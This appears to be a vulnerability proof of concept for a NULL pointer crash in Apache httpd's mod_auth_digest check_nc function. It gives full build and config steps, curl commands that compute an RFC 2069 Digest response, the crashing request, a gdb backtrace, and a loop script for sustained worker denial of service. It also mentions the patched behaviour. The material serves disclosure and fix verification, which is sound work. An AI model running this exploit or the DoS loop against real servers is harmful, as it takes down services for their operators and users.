# 024 — mod_auth_digest NULL nonce-count crash

`check_nc()` at `modules/aaa/mod_auth_digest.c:1393` calls
`strtol(resp->nonce_count, ...)` without checking for NULL. An RFC 2069
qop-less Digest header with valid credentials reaches that path and
crashes the worker.

## Setup

Build httpd with mod_auth_digest:

```bash
./configure --prefix=$PWD/inst --enable-auth-digest
make -j && make install
```

Create a digest password file:

```bash
./inst/bin/htdigest -c /etc/httpd/digest 'realm' alice
# password: secret
```

`httpd.conf` snippet:

```apache
LoadModule auth_digest_module modules/mod_auth_digest.so

<Location "/secret">
    AuthType Digest
    AuthName "realm"
    AuthDigestProvider file
    AuthUserFile /etc/httpd/digest
    AuthDigestNcCheck On
    AuthDigestQop auth
    Require valid-user
</Location>
```

Run as a single child so the crash is observable:

```bash
./inst/bin/httpd -X -f /etc/httpd/conf/httpd.conf &
```

## Trigger

Step 1 — fetch a fresh nonce by sending an unauthenticated request:

```bash
NONCE=$(curl -sI http://127.0.0.1:8080/secret/ \
    | sed -n 's/.*nonce="\([^"]*\)".*/\1/p')
echo "nonce=$NONCE"
```

Step 2 — compute the RFC 2069 response (no qop, no nc, no cnonce):

```bash
HA1=$(printf 'alice:realm:secret' | md5sum | cut -d' ' -f1)
HA2=$(printf 'GET:/secret/'      | md5sum | cut -d' ' -f1)
RESP=$(printf '%s:%s:%s' "$HA1" "$NONCE" "$HA2" | md5sum | cut -d' ' -f1)
```

Step 3 — submit the qop-less Digest authorization. Because there is no
`qop` and no `nc` in the request, `resp->nonce_count` stays NULL:

```bash
curl -v "http://127.0.0.1:8080/secret/" \
  -H "Authorization: Digest username=\"alice\", realm=\"realm\", \
nonce=\"$NONCE\", uri=\"/secret/\", response=\"$RESP\""
```

## Observed effect

The worker process segfaults inside `check_nc` -> `strtol(NULL, ...)`:

```text
[core] AH00052: child pid NN exit signal Segmentation fault (11)
```

Backtrace under gdb:

```text
#0  __strtol_internal (nptr=0x0, ...)
#1  check_nc (r=..., resp=0x..., conf=0x...) at mod_auth_digest.c:1404
#2  authenticate_digest_user (r=...) at mod_auth_digest.c:2050
```

The parent restarts the child (in non `-X` mode), so a small loop produces a
sustained worker-DoS:

```bash
while true; do
  curl -s -o /dev/null -m 2 http://127.0.0.1:8080/secret/ \
    -H "Authorization: Digest username=\"alice\", realm=\"realm\", \
        nonce=\"$NONCE\", uri=\"/secret/\", response=\"$RESP\""
done
```

The patched build returns 401 with an `AH01773 missing nonce count` log line
instead of crashing.
